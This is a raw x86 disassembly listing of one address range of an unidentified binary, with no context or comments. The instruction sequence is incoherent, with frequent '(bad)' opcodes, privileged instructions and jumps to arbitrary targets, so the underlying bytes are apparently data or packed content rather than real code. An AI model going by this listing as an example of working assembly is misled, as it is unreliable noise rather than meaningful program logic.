  499623:	(bad)  
  499624:	inc    esi
  499625:	sti    
  499626:	xor    cl,BYTE PTR [edx]
  499628:	pop    es
  499629:	jne    0x499635
  49962b:	add    DWORD PTR [ebx],edi
  49962d:	jne    0x49960b
  49962f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499630:	mov    al,0x16
  499632:	sub    BYTE PTR [edi+0x8],0x51
  499636:	and    al,0x16
  499638:	dec    ebp
  499639:	adc    eax,0x24ed2a1e
  49963e:	pop    esi
  49963f:	xchg   ecx,eax
  499640:	clc    
  499641:	inc    ebx
  499642:	push   cs
  499643:	sbb    eax,0x80de43fb
  499648:	jl     0x499603
  49964a:	sbb    dl,BYTE PTR [ebx]
  49964c:	stc    
  49964d:	(bad)  
  49964e:	inc    DWORD PTR [edi+0x48]
  499651:	push   cs
  499652:	lock jbe 0x499615
  499655:	loopne 0x49963f
  499657:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  499658:	mov    esp,0x4c8d0a7e
  49965d:	add    al,cl
  49965f:	add    DWORD PTR [edx+0x1a650604],edi
  499665:	mov    eax,ds:0xab892db
  49966a:	add    ebx,0x40
  49966d:	xlat   BYTE PTR ds:[ebx]
  49966e:	jb     0x49964f
  499670:	push   ecx
  499671:	cld    
  499672:	mov    WORD PTR [esi-0x713e9e51],es
  499678:	sub    DWORD PTR [ecx+edx*2+0xe],ebx
  49967c:	inc    esp
  49967d:	dec    ebp
  49967e:	and    edi,DWORD PTR [eax+0x7faf0624]
  499684:	jne    0x49967c
  499686:	jmp    0x41483a3f
  49968b:	xchg   ecx,eax
  49968c:	inc    edi
  49968d:	mov    ch,BYTE PTR [ecx]
  49968f:	jp     0x49969c
  499691:	dec    ebp
  499692:	pusha  
  499693:	(bad)  
  499694:	out    dx,eax
  499695:	push   ss
  499696:	push   cs
  499697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  499698:	gs push eax
  49969a:	push   ebx
  49969b:	cli    
  49969c:	push   ebp
  49969d:	ja     0x4996a7
  49969f:	bswap  ebx
  4996a1:	xchg   ebx,eax
  4996a2:	dec    ebx
  4996a3:	push   ebp
  4996a4:	mov    ds:0x346a07d5,eax
  4996a9:	sbb    edi,0xc20d8df9
  4996af:	mov    ch,0xaf
  4996b1:	dec    ebx
  4996b2:	ins    BYTE PTR es:[edi],dx
  4996b3:	add    edi,ebx
  4996b5:	xor    BYTE PTR [edi],dl
  4996b7:	xor    al,0xc7
  4996b9:	pop    ss
  4996ba:	out    dx,eax
  4996bb:	mov    ebx,0xddaa8411
  4996c0:	push   ds
  4996c1:	ret    
  4996c2:	std    
  4996c3:	test   eax,0xb5b01276
  4996c8:	sub    al,0x98
  4996ca:	xchg   esi,eax
  4996cb:	pop    edi
  4996cc:	dec    DWORD PTR [eax]
  4996ce:	loopne 0x4996f0
  4996d0:	add    BYTE PTR [edi+0x410f3aee],bh
  4996d6:	clc    
  4996d7:	ins    BYTE PTR es:[edi],dx
  4996d8:	lea    esp,[esi+0x274c3aef]
  4996de:	mov    dl,0x75
  4996e0:	test   BYTE PTR [esi],al
  4996e2:	push   ebx
  4996e3:	xor    eax,DWORD PTR [esi]
  4996e5:	cmc    
  4996e6:	into   
  4996e7:	mov    ch,0xb0
  4996e9:	shl    BYTE PTR [ecx],1
  4996eb:	int3   
  4996ec:	mov    fs,WORD PTR [esi]
  4996ee:	adc    eax,0xb08913f7
  4996f3:	fiadd  DWORD PTR [edi+0x5202c27c]
  4996f9:	inc    esi
  4996fa:	scas   eax,DWORD PTR es:[edi]
  4996fb:	jno    0x499695
  4996fd:	ret    0xd23d
  499700:	(bad)  
  499701:	adc    BYTE PTR [eax],al
  499703:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  499704:	aam    0xd4
  499706:	pop    ss
  499707:	inc    ecx
  499708:	mov    ah,0x5a
  49970a:	cmp    DWORD PTR [esi],0xe45203b
  499710:	push   0x28
  499712:	mov    cl,0x4a
  499714:	sub    eax,0x2f18159
  499719:	jae    0x499754
  49971b:	xchg   bl,bl
  49971d:	add    al,0x77
  49971f:	and    ecx,DWORD PTR [eax+0x5dc860f]
  499725:	sbb    BYTE PTR [esp+ebx*8+0xd],ah
  499729:	push   eax
  49972a:	or     bh,BYTE PTR [ecx+eax*4]
  49972d:	push   0xffffffe1
  49972f:	fnstcw WORD PTR [ebp-0x6]
  499732:	inc    esi
  499733:	cli    
  499734:	fcmovnu st,st(2)
  499736:	xor    eax,0xd942ff1a
  49973b:	ins    DWORD PTR es:[edi],dx
  49973c:	lock fistp QWORD PTR [ebp+0x60]
  499740:	in     al,dx
  499741:	stos   BYTE PTR es:[edi],al
  499742:	push   ss
  499743:	cli    
  499744:	enter  0x5200,0xe9
  499748:	jg     0x4997be
  49974a:	or     BYTE PTR [eax-0x2c],ah
  49974d:	xchg   BYTE PTR [edi+eax*2],dh
  499750:	push   ebp
  499751:	push   edi
  499752:	icebp  
  499753:	pushf  
  499754:	ret    
  499755:	add    al,0xc8
  499757:	pop    eax
  499758:	mov    eax,0xae1d134d
  49975d:	pop    edi
  49975e:	adc    al,0xf3
  499760:	(bad)  
  499761:	std    
  499762:	sub    BYTE PTR [ebx-0xe],bl
  499765:	dec    edx
  499766:	pop    esi
  499767:	push   ss
  499768:	mov    al,es:0x9c879c87
  49976e:	xchg   eax,eax
  499770:	inc    edi
  499771:	pushf  
  499772:	arpl   WORD PTR [ecx],cx
  499774:	mov    DWORD PTR [esi],ebx
  499776:	xor    dh,BYTE PTR [esi+0x38]
  499779:	jo     0x4997d1
  49977b:	cmp    BYTE PTR [edx],cl
  49977d:	mov    ecx,0x4b9e8cc2
  499782:	jne    0x4997db
  499784:	add    bh,BYTE PTR [ecx+0x2f]
  499787:	mov    gs,WORD PTR [esi-0x40]
  49978a:	pop    edi
  49978b:	and    dh,BYTE PTR [ecx+0x18f92795]
  499791:	adc    cl,BYTE PTR [ebx+0x54e2dc03]
  499797:	cmp    eax,0x4b
  49979a:	mov    bl,0xd1
  49979c:	fld    QWORD PTR [ebx]
  49979e:	push   0xffffffdc
  4997a0:	or     ecx,edi
  4997a2:	adc    esp,eax
  4997a4:	or     al,0xb2
  4997a6:	sbb    dl,dh
  4997a8:	sbb    bh,BYTE PTR [ebx-0x12433ac8]
  4997ae:	lods   eax,DWORD PTR ds:[esi]
  4997af:	icebp  
  4997b0:	loopne 0x4997a3
  4997b2:	cmp    edx,DWORD PTR [ebx+0x23]
  4997b5:	mov    ebp,0x2bc1955b
  4997ba:	or     eax,0x44bbeec7
  4997bf:	mov    ah,0x70
  4997c1:	imul   ebp,DWORD PTR [ebx+0x7414565d],0xffffffc4
  4997c8:	dec    ecx
  4997c9:	add    al,cl
  4997cb:	push   ss
  4997cc:	daa    
  4997cd:	pop    edx
  4997ce:	xor    BYTE PTR [ebp+esi*1+0x5847b31],dh
  4997d5:	gs push edx
  4997d7:	push   edi
  4997d8:	jnp    0x49978e
  4997da:	int    0x51
  4997dc:	sbb    al,0x2a
  4997de:	das    
  4997df:	sub    ebp,ecx
  4997e1:	lahf   
  4997e2:	clc    
  4997e3:	clc    
  4997e4:	jae    0x4997d8
  4997e6:	xor    BYTE PTR ds:0xf8feacfe,ah
  4997ec:	inc    edx
  4997ed:	jo     0x4997f3
  4997ef:	dec    esp
  4997f0:	clc    
  4997f1:	sub    al,0x86
  4997f3:	xor    dh,BYTE PTR [ebp-0x1611837]
  4997f9:	pop    ds
  4997fa:	sbb    al,0x7f
  4997fc:	pusha  
  4997fd:	mov    ch,0x21
  4997ff:	int    0x11
  499801:	push   ebp
  499802:	push   esi
  499803:	jno    0x4997c6
  499805:	in     eax,dx
  499806:	adc    DWORD PTR [edx],esi
  499808:	pop    eax
  499809:	inc    ebp
  49980a:	hlt    
  49980b:	imul   ebx,DWORD PTR [ecx],0x7f
  49980e:	push   cs
  49980f:	sbb    BYTE PTR ss:[esi],cl
  499812:	pop    ds
  499813:	xor    ebx,DWORD PTR [esi]
  499815:	sbb    eax,0x24c38ce
  49981a:	xchg   DWORD PTR [edi],esi
  49981c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49981d:	and    bl,BYTE PTR [ebx-0x28]
  499820:	pop    esi
  499821:	shl    ch,1
  499823:	ret    0x9b05
  499826:	out    dx,eax
  499827:	mov    ch,0x17
  499829:	or     ch,BYTE PTR [edi+0x61]
  49982c:	adc    al,0x52
  49982e:	lods   eax,DWORD PTR ds:[esi]
  49982f:	test   al,0x33
  499831:	xchg   BYTE PTR [eax],dh
  499833:	sbb    al,0xb0
  499835:	leave  
  499836:	lods   eax,DWORD PTR ds:[esi]
  499837:	fmul   st,st(5)
  499839:	in     al,0x3b
  49983b:	rcr    DWORD PTR ds:0xd15352c3,1
  499841:	push   ds
  499842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  499843:	dec    esp
  499844:	adc    eax,0xc93002c7
  499849:	ins    DWORD PTR es:[edi],dx
  49984a:	mov    al,ds:0xf8c6d126
  49984f:	inc    eax
  499850:	add    dh,BYTE PTR [esi-0x75]
  499853:	add    al,dl
  499855:	ins    DWORD PTR es:[edi],dx
  499856:	rcl    BYTE PTR [ecx],0x2
  499859:	and    eax,0xbfc06600
  49985e:	out    dx,al
  49985f:	jmp    0x49986b
  499861:	push   0x4e9b358c
  499866:	repz popf 
  499868:	pop    eax
  499869:	mov    ebp,0xf764d275
  49986e:	mov    DWORD PTR [ebx+edx*2-0x5fde39a1],edi
  499875:	or     BYTE PTR [eax-0x63ff4ee0],ah
  49987b:	adc    eax,0xee53b844
  499880:	aam    0xe1
  499882:	mov    BYTE PTR [ecx+eiz*4],al
  499885:	cmp    esi,DWORD PTR [ebp-0x25]
  499888:	push   ebx
  499889:	lods   al,BYTE PTR ds:[esi]
  49988a:	clc    
  49988b:	or     BYTE PTR [esi+0x4cb500b3],ah
  499891:	dec    esi
  499892:	jb     0x4998f6
  499894:	pushf  
  499895:	sbb    ecx,ebp
  499897:	call   0x1da6:0xf9160525
  49989e:	or     esp,edi
  4998a0:	mov    ah,0x74
  4998a2:	jo     0x4998d4
  4998a4:	lods   al,BYTE PTR fs:[esi]
  4998a6:	sub    al,0xa0
  4998a8:	call   0xffc154e4
  4998ad:	xchg   esp,eax
  4998ae:	(bad)  
  4998b0:	sti    
  4998b1:	ss mov bh,0x9b
  4998b4:	adc    BYTE PTR [ecx],al
  4998b6:	xlat   BYTE PTR ds:[ebx]
  4998b7:	push   esi
  4998b8:	inc    esp
  4998b9:	cmp    eax,0x42f9346d
  4998be:	xor    eax,0x6d64386d
  4998c3:	pop    es
  4998c4:	add    al,0xc
  4998c6:	xor    cl,dl
  4998c8:	retf   0xa447
  4998cb:	mov    ds,eax
  4998cd:	mov    eax,ds:0x97a77511
  4998d2:	call   0x70759ec7
  4998d7:	sub    cl,BYTE PTR [edi+0x78b8ac88]
  4998dd:	lods   eax,DWORD PTR ds:[esi]
  4998de:	ret    0x4e14
  4998e1:	xor    ecx,ebp
  4998e3:	aas    
  4998e4:	jnp    0x4998ac
  4998e6:	sub    edx,DWORD PTR [ebx]
  4998e8:	fsub   DWORD PTR [ebx]
  4998ea:	stos   DWORD PTR es:[edi],eax
  4998eb:	inc    esp
  4998ec:	xchg   ebp,eax
  4998ed:	je     0x499905
  4998ef:	jg     0x4998bc
  4998f1:	xchg   ebx,eax
  4998f2:	or     DWORD PTR [eax],esp
  4998f4:	add    al,0x20
  4998f6:	add    dl,BYTE PTR [eax]
  4998f8:	inc    edi
  4998f9:	and    cl,BYTE PTR [ecx]
  4998fb:	sbb    edi,DWORD PTR [eax+0x7e1d510e]
  499901:	push   cs
  499902:	shr    BYTE PTR [ecx],1
  499904:	add    BYTE PTR [edx*2-0x22fd3148],al
  49990b:	cmp    esp,DWORD PTR [esi+0x2104e271]
  499911:	and    bl,BYTE PTR [bp+di-0x28]
  499915:	(bad)  
  499916:	add    BYTE PTR [ebx+0x6],bh
  499919:	pop    esi
  49991a:	setns  BYTE PTR [ecx+0x4d]
  49991e:	pusha  
  49991f:	fst    QWORD PTR [edi+0x69]
  499922:	outs   dx,DWORD PTR ds:[esi]
  499923:	mov    edx,0x15011f05
  499928:	fdivp  st(7),st
  49992a:	push   0x70
  49992c:	es rol eax,0xdf
  499930:	(bad)  
  499931:	sar    BYTE PTR [eax+0x454054fb],cl
  499937:	sub    al,0xd8
  499939:	lods   al,BYTE PTR ds:[esi]
  49993a:	xlat   BYTE PTR ds:[ebx]
  49993b:	aas    
  49993c:	sub    eax,0xd804a7f5
  499941:	or     al,0x80
  499943:	pushf  
  499944:	sar    ebp,cl
  499946:	adc    dh,bl
  499948:	xor    eax,0xe434592
  49994d:	sub    BYTE PTR [esi],ch
  49994f:	rcr    DWORD PTR [ecx-0x3229bbec],0x20
  499956:	js     0x4998e8
  499958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  499959:	sub    cl,BYTE PTR [eax]
  49995b:	adc    BYTE PTR [ecx+0x1a0cff0d],ch
  499961:	mov    WORD PTR [ebp-0x40],cs
  499964:	xor    BYTE PTR [ecx-0x49cab69e],dh
  49996a:	add    eax,0xee9ac10
  49996f:	data16 adc dl,BYTE PTR [edi+0x50]
  499973:	push   edx
  499974:	shl    BYTE PTR [ebx+0x76684429],0xe3
  49997b:	or     BYTE PTR [edi+0x17],bl
  49997e:	add    eax,0xd6b21a24
  499983:	or     al,0x51
  499985:	das    
  499986:	int    0x13
  499988:	shl    BYTE PTR [esi],cl
  49998a:	and    al,0x55
  49998c:	or     al,0x52
  49998e:	xor    al,0x3
  499990:	sbb    DWORD PTR [esi-0x5d],esp
  499993:	fstp   st(2)
  499995:	and    eax,0x33823350
  49999a:	lock mov esp,0xccea0538
  4999a0:	push   si
  4999a2:	inc    ebx
  4999a3:	iret   
  4999a4:	test   BYTE PTR [edi+0x3a],0xd2
  4999a8:	ret    0x1b21
  4999ab:	mov    bh,0xbc
  4999ad:	sub    ebp,edx
  4999af:	push   ss
  4999b0:	mov    al,al
  4999b2:	pop    es
  4999b3:	mov    ch,bl
  4999b5:	movsx  edi,WORD PTR [esp+edi*8-0x75eceaff]
  4999bd:	fld    QWORD PTR [edi]
  4999bf:	adc    ecx,DWORD PTR [edx+0xc8d8d13]
  4999c5:	dec    edi
  4999c6:	and    BYTE PTR [edi],0x8c
  4999c9:	cmp    ebx,eax
  4999cb:	loop   0x499964
  4999cd:	dec    edi
  4999ce:	dec    ebx
  4999cf:	psrlq  mm5,QWORD PTR [ebp+0x20aedb9d]
  4999d6:	push   esi
  4999d7:	lock or BYTE PTR [edi-0x6],al
  4999db:	add    DWORD PTR [edx],esi
  4999dd:	mov    ebp,0x9c7250e5
  4999e2:	cmp    al,bl
  4999e4:	push   eax
  4999e5:	imul   edx,DWORD PTR [edx-0x26],0x6e
  4999e9:	push   ebx
  4999ea:	outs   dx,DWORD PTR ds:[esi]
  4999eb:	rol    BYTE PTR [ebx],0x58
  4999ee:	add    DWORD PTR [ebx],edi
  4999f0:	hlt    
  4999f1:	mov    eax,ds:0x3f282df4
  4999f6:	xchg   esp,eax
  4999f7:	and    BYTE PTR [edi],dh
  4999f9:	inc    esi
  4999fa:	adc    bh,BYTE PTR [edx+0x2a09c3e0]
  499a00:	add    ecx,esi
  499a02:	push   ss
  499a03:	jbe    0x499a0a
  499a05:	sub    eax,DWORD PTR [ecx]
  499a07:	push   0xf010ab21
  499a0c:	push   edi
  499a0d:	(bad)  
  499a0e:	jbe    0x4999a1
  499a10:	lock dec ebx
  499a12:	gs push edi
  499a14:	add    al,0x2b
  499a16:	sbb    BYTE PTR [edi],al
  499a18:	sub    edx,esi
  499a1a:	jl     0x4999f0
  499a1c:	sbb    esp,ebp
  499a1e:	ret    
  499a1f:	adc    al,BYTE PTR [edx]
  499a21:	push   eax
  499a22:	push   ecx
  499a23:	add    edx,DWORD PTR [edx]
  499a25:	adc    DWORD PTR es:[ebp+0x40200868],ecx
  499a2c:	int3   
  499a2d:	imul   ebp,DWORD PTR [ecx],0xffffff96
  499a30:	pop    esp
  499a31:	call   0xc2d1:0x8d82e82
  499a38:	or     ebp,DWORD PTR [edx]
  499a3a:	push   ss
  499a3b:	mov    edi,0x6fb7119f
  499a40:	fs cmp ah,BYTE PTR ss:[ebp-0x3d]
  499a45:	shr    BYTE PTR [ecx],cl
  499a47:	adc    eax,0x14d8a9d
  499a4c:	jge    0x499acb
  499a4e:	inc    edx
  499a4f:	int3   
  499a50:	push   ss
  499a51:	sar    BYTE PTR [edx+0x61689a70],1
  499a57:	jp     0x499a8d
  499a59:	inc    ebp
  499a5a:	hlt    
  499a5b:	add    eax,0xc88a275
  499a60:	sti    
  499a61:	add    DWORD PTR [ebx+0x1],eax
  499a64:	pop    edi
  499a65:	mov    ah,0x86
  499a67:	adc    DWORD PTR [edi+0x369816ed],esi
  499a6d:	int    0x6e
  499a6f:	sub    al,0xe1
  499a71:	test   DWORD PTR [esi+0xb121cb8],esp
  499a77:	test   bh,cl
  499a79:	pop    esp
  499a7a:	dec    esp
  499a7b:	mov    BYTE PTR [eax+0x5a],dh
  499a7e:	and    BYTE PTR [ebx],bh
  499a80:	ret    0x697c
  499a83:	idiv   BYTE PTR [edx]
  499a85:	ins    BYTE PTR es:[edi],dx
  499a86:	jbe    0x499a3c
  499a88:	jnp    0x499a14
  499a8a:	push   cs
  499a8b:	into   
  499a8c:	pop    ebx
  499a8d:	test   DWORD PTR [edx-0x4714653c],0x842441af
  499a97:	push   ebp
  499a98:	or     al,BYTE PTR [eax-0x39]
  499a9b:	ja     0x499ad1
  499a9d:	mov    esi,DWORD PTR [ebp-0x7e795c50]
  499aa3:	push   edi
  499aa4:	jp     0x499a32
  499aa6:	cmp    al,0x7d
  499aa8:	push   edi
  499aa9:	xchg   DWORD PTR [edi],eax
  499aab:	sbb    BYTE PTR [ecx-0x33],ch
  499aae:	pushf  
  499aaf:	not    BYTE PTR [edi]
  499ab1:	jno    0x499af5
  499ab3:	adc    BYTE PTR [eax-0x29],bh
  499ab6:	pop    ecx
  499ab7:	mov    eax,ds:0x78f5471c
  499abc:	ins    BYTE PTR es:[edi],dx
  499abd:	fwait
  499abe:	or     eax,esp
  499ac0:	jp     0x499acf
  499ac2:	push   ds
  499ac3:	test   ebp,esp
  499ac5:	add    eax,0xa3f73aa2
  499aca:	cmp    DWORD PTR [ebp+0x66],ecx
  499acd:	inc    edx
  499ace:	sub    BYTE PTR [ebx+0x48812677],al
  499ad4:	push   ss
  499ad5:	and    BYTE PTR [eax],al
  499ad7:	stos   BYTE PTR es:[edi],al
  499ad8:	or     DWORD PTR [eax+esi*1-0x7f],esp
  499adc:	or     al,0x97
  499ade:	inc    esi
  499adf:	push   ebx
  499ae0:	sbb    BYTE PTR [ebx+0x297de5fd],dh
  499ae6:	dec    ebp
  499ae7:	popa   
  499ae8:	add    DWORD PTR ds:0x6520bc6a,eax
  499aee:	xor    ah,0xaa
  499af1:	dec    ecx
  499af2:	rcl    edx,0xfe
  499af5:	inc    ebp
  499af6:	add    bh,BYTE PTR ds:0xd4b63d5e
  499afc:	mov    cl,0x8
  499afe:	mov    ch,0xd7
  499b00:	and    al,0x57
  499b02:	iret   
  499b03:	and    eax,0x56286332
  499b08:	stos   BYTE PTR es:[edi],al
  499b09:	ja     0x499b0d
  499b0b:	jne    0x499b76
  499b0d:	mov    ah,0xbb
  499b0f:	dec    ebx
  499b10:	and    al,0x87
  499b12:	add    BYTE PTR [edi],ch
  499b14:	mov    bh,0x4b
  499b16:	sbb    DWORD PTR [ebx],edx
  499b18:	cmp    dl,dl
  499b1a:	daa    
  499b1b:	xor    ah,al
  499b1d:	loope  0x499b15
  499b1f:	add    eax,0x7a4ef750
  499b24:	inc    ebp
  499b25:	in     al,dx
  499b26:	and    BYTE PTR [edi-0x4dfb4df0],dl
  499b2c:	push   eax
  499b2d:	or     eax,esp
  499b2f:	retf   
  499b30:	adc    al,0xe
  499b32:	or     bl,dh
  499b34:	fwait
  499b35:	add    BYTE PTR [esi],ch
  499b37:	cmp    eax,0xf7270c9e
  499b3c:	xchg   eax,ebp
  499b3e:	pop    edi
  499b3f:	xchg   DWORD PTR [edi],edi
  499b41:	or     al,0xb0
  499b43:	mov    eax,DWORD PTR [ecx]
  499b45:	leave  
  499b46:	sbb    edx,DWORD PTR [ebx+0x14b73b46]
  499b4c:	sub    ch,BYTE PTR [ecx+0x72d3e66c]
  499b52:	ret    0xd08
  499b55:	adc    eax,0x9afce088
  499b5a:	add    BYTE PTR [ebx+0xc4e533e],dh
  499b60:	jne    0x499b74
  499b62:	xchg   BYTE PTR [ecx],bh
  499b64:	jne    0x499bc6
  499b66:	mov    ah,0xe1
  499b68:	jmp    0x499b8b
  499b6a:	enter  0xf418,0x9e
  499b6e:	inc    esi
  499b6f:	add    bl,ah
  499b71:	(bad)  
  499b72:	popa   
  499b73:	sbb    BYTE PTR ds:[ebx],cl
  499b76:	mov    cl,0x16
  499b78:	jl     0x499bc2
  499b7a:	or     al,0xe1
  499b7c:	(bad)  
  499b7d:	repnz mov esi,0x6b33c64b
  499b83:	lahf   
  499b84:	in     al,0xfc
  499b86:	(bad)  
  499b87:	fwait
  499b88:	add    eax,0x22a0d90e
  499b8d:	popa   
  499b8e:	lock cld 
  499b90:	or     DWORD PTR [ebx-0x6d0f88b6],esp
  499b96:	fisub  DWORD PTR [esp+esi*8]
  499b99:	dec    ebp
  499b9a:	loopne 0x499be6
  499b9c:	xchg   ebp,eax
  499b9d:	retf   
  499b9e:	sub    DWORD PTR [edi],0xffffffae
  499ba1:	pop    DWORD PTR [eax]
  499ba3:	mov    cl,0x28
  499ba5:	xchg   ebp,eax
  499ba6:	add    eax,0x4256b52b
  499bab:	adc    BYTE PTR [ecx],dl
  499bad:	add    al,0x48
  499baf:	and    al,BYTE PTR [eax]
  499bb1:	iret   
  499bb2:	and    DWORD PTR [eax],esi
  499bb4:	xchg   ebp,eax
  499bb5:	std    
  499bb6:	mov    cl,0xb1
  499bb8:	lahf   
  499bb9:	int    0x4
  499bbb:	frstor [edi+0x54]
  499bbe:	sub    al,cl
  499bc0:	cmp    al,0x20
  499bc2:	push   ss
  499bc3:	jmp    0x208166dd
  499bc8:	fmul   QWORD PTR [ecx-0x73]
  499bcb:	pop    es
  499bcc:	ja     0x499c3b
  499bce:	push   esp
  499bcf:	xchg   edi,eax
  499bd0:	std    
  499bd1:	shr    eax,0x71
  499bd4:	inc    edx
  499bd5:	shr    DWORD PTR [esi+0x5750e723],1
  499bdb:	or     eax,0xd9d8b478
  499be0:	(bad)  
  499be1:	dec    ebx
  499be2:	mov    edi,0x7bc0987d
  499be7:	jne    0x499bc7
  499be9:	ret    
  499bea:	les    eax,FWORD PTR [edi]
  499bec:	lahf   
  499bed:	push   esi
  499bee:	hlt    
  499bef:	adc    edx,DWORD PTR [ebp-0x3e]
  499bf2:	popf   
  499bf3:	mov    dh,0xdc
  499bf5:	(bad)  
  499bf6:	fist   DWORD PTR [ebp-0x7e]
  499bf9:	or     ch,ah
  499bfb:	push   eax
  499bfc:	outs   dx,DWORD PTR ds:[esi]
  499bfd:	or     ecx,edi
  499bff:	push   ebp
  499c00:	xlat   BYTE PTR ds:[ebx]
  499c01:	or     dl,bh
  499c03:	xor    eax,0xa8a3578f
  499c08:	clc    
  499c09:	(bad)  
  499c0b:	clc    
  499c0c:	fld    TBYTE PTR [ebx+0x67]
  499c0f:	fistp  QWORD PTR [esi+0x31]
  499c12:	xor    dl,BYTE PTR [edi-0x61f8f4c]
  499c18:	push   es
  499c19:	xchg   ebx,eax
  499c1a:	ucomiss xmm2,DWORD PTR [ebx-0x1f0661b2]
  499c21:	bound  esp,QWORD PTR [edx+edi*1+0x7]
  499c25:	xor    dh,BYTE PTR [eax-0x6e]
  499c28:	or     bl,ah
  499c2a:	gs out dx,al
  499c2c:	dec    ebx
  499c2d:	add    al,0x95
  499c2f:	cwde   
  499c30:	sar    BYTE PTR [eax+0x4a],1
  499c33:	and    ebp,eax
  499c35:	das    
  499c36:	push   ebx
  499c37:	mov    eax,0xf848c31c
  499c3c:	ror    DWORD PTR [edx-0x2dfbeb26],1
  499c42:	mov    esi,0x293b4174
  499c47:	pushf  
  499c48:	daa    
  499c49:	jns    0x499c68
  499c4b:	fsubp  st(3),st
  499c4d:	push   ds
  499c4e:	fiadd  DWORD PTR [esi+0x4b]
  499c51:	(bad)  
  499c53:	sbb    BYTE PTR [esi+edi*4],dh
  499c56:	mov    DWORD PTR [ebp+0xa],edi
  499c59:	jmp    0x47e6:0x7e8b5b6f
  499c60:	fidivr DWORD PTR [edx]
  499c62:	jle    0x499c21
  499c64:	lds    edx,FWORD PTR [edx+eiz*1]
  499c67:	xchg   DWORD PTR ds:0x531ec033,esi
  499c6d:	or     edi,DWORD PTR [eax]
  499c6f:	rol    BYTE PTR [ebx],1
  499c71:	int3   
  499c72:	call   FWORD PTR [eax-0x1ef81fdc]
  499c78:	xor    bl,bl
  499c7a:	das    
  499c7b:	shl    BYTE PTR [ebp+0x0],0x66
  499c7f:	push   0xffffff97
  499c81:	dec    edi
  499c82:	push   edx
  499c83:	pusha  
  499c84:	rcl    BYTE PTR [edi-0x79],cl
  499c87:	imul   ecx,esi,0xbe50a141
  499c8d:	sub    edi,DWORD PTR [eax]
  499c8f:	xchg   esp,eax
  499c90:	or     DWORD PTR es:[eax-0x15],ecx
  499c94:	xchg   ebx,eax
  499c95:	push   edi
  499c96:	xchg   ecx,eax
  499c97:	mov    ebp,0x1935af02
  499c9c:	sbb    esi,ebx
  499c9e:	or     al,0x47
  499ca0:	xchg   BYTE PTR [eax+0x1169254f],al
  499ca6:	pop    esp
  499ca7:	mov    bl,0x1
  499ca9:	and    al,0x1
  499cab:	cs sti 
  499cad:	and    eax,DWORD PTR [eax+0x380926e8]
  499cb3:	in     eax,dx
  499cb4:	lods   al,BYTE PTR ds:[esi]
  499cb5:	pusha  
  499cb6:	test   bh,cl
  499cb8:	adc    BYTE PTR [esi],bl
  499cba:	sbb    al,al
  499cbc:	pop    es
  499cbd:	jg     0x499d1c
  499cbf:	push   ss
  499cc0:	std    
  499cc1:	inc    ebx
  499cc2:	ficom  WORD PTR [eax+0x6a]
  499cc5:	gs push ecx
  499cc7:	aam    0xd0
  499cc9:	and    eax,0x340600a
  499cce:	push   edi
  499ccf:	rol    dh,1
  499cd1:	pop    esp
  499cd2:	push   esi
  499cd3:	push   eax
  499cd4:	push   esp
  499cd5:	add    cl,dl
  499cd7:	cmp    DWORD PTR [ecx-0x10b840dd],esp
  499cdd:	inc    edx
  499cde:	add    cl,BYTE PTR [esi-0x75]
  499ce1:	xor    eax,0x38b25688
  499ce6:	imul   esi,DWORD PTR [edi],0xbdaaf6b
  499cec:	dec    eax
  499ced:	test   al,0x90
  499cef:	shl    BYTE PTR [ecx+0x48],0x43
  499cf3:	mov    ds:0x92376433,ax
  499cf9:	jnp    0x499cb1
  499cfb:	xor    ch,BYTE PTR [edi-0x41]
  499cfe:	bound  ebp,QWORD PTR [esi+eax*2-0x5d]
  499d02:	outs   dx,BYTE PTR ds:[esi]
  499d03:	or     ecx,edx
  499d05:	mov    ecx,DWORD PTR ds:[esi-0x74]
  499d09:	inc    esi
  499d0a:	adc    BYTE PTR [edi+0x51],dl
  499d0d:	jo     0x499cc3
  499d0f:	adc    BYTE PTR [ebp-0x371dceb0],0x3a
  499d16:	ins    DWORD PTR es:[edi],dx
  499d17:	mov    WORD PTR [esi],ss
  499d19:	addr16 pop esp
  499d1b:	mov    dh,0x22
  499d1d:	jno    0x499cfc
  499d1f:	cmc    
  499d20:	mov    eax,ds:0x805f0ebe
  499d25:	mov    ah,0x9
  499d27:	(bad)  
  499d28:	enter  0x2666,0x80
  499d2c:	nop
  499d2d:	and    al,0xaf
  499d2f:	call   0x4dc69dce
  499d34:	js     0x499cc5
  499d36:	arpl   WORD PTR [ebp-0x7ebcc91a],cx
  499d3c:	cmovo  eax,esi
  499d3f:	xchg   DWORD PTR [ebx],ebp
  499d41:	xchg   esp,eax
  499d42:	imul   ecx,DWORD PTR [ebp-0x71],0xffffffdd
  499d46:	lea    ebp,[eax+0x1c]
  499d49:	pop    ebx
  499d4a:	add    cl,ch
  499d4c:	push   ss
  499d4d:	test   al,0x4b
  499d4f:	sbb    DWORD PTR [edi-0x38],ebx
  499d52:	mov    ebx,0x95487688
  499d57:	cmp    BYTE PTR [edi-0x749a616b],0x59
  499d5e:	sub    esp,DWORD PTR [edi-0x4cc64d67]
  499d64:	ins    BYTE PTR es:[edi],dx
  499d65:	leave  
  499d66:	shl    DWORD PTR [edi+0x4bb29bb0],0xa4
  499d6d:	jb     0x499d30
  499d6f:	call   0x4dfc:0x52953d49
  499d76:	or     esp,DWORD PTR [ebx]
  499d78:	mov    ecx,0x380cbd39
  499d7d:	int    0x33
  499d7f:	mov    ss,WORD PTR [edx]
  499d81:	or     DWORD PTR [edi],ebp
  499d83:	pop    esi
  499d84:	pop    eax
  499d85:	push   ss
  499d86:	mov    WORD PTR [edx],es
  499d88:	cmp    BYTE PTR [ecx],bl
  499d8a:	and    al,0xc2
  499d8c:	div    DWORD PTR [ecx+0x3e]
  499d8f:	dec    edx
  499d90:	and    DWORD PTR ds:0x301ada84,ebx
  499d96:	sbb    DWORD PTR ds:0xfb4a84c8,eax
  499d9c:	nop
  499d9d:	xor    BYTE PTR [esi+0x0],al
  499da0:	cmp    DWORD PTR [esi+0x14],esi
  499da3:	adc    ah,BYTE PTR [ecx+0x16]
  499da6:	lock int 0xed
  499da9:	data16 jbe 0x499db6
  499dac:	or     BYTE PTR [ecx+0x72],al
  499daf:	adc    al,BYTE PTR [esi+0x77]
  499db2:	or     eax,0x52d44150
  499db7:	push   ss
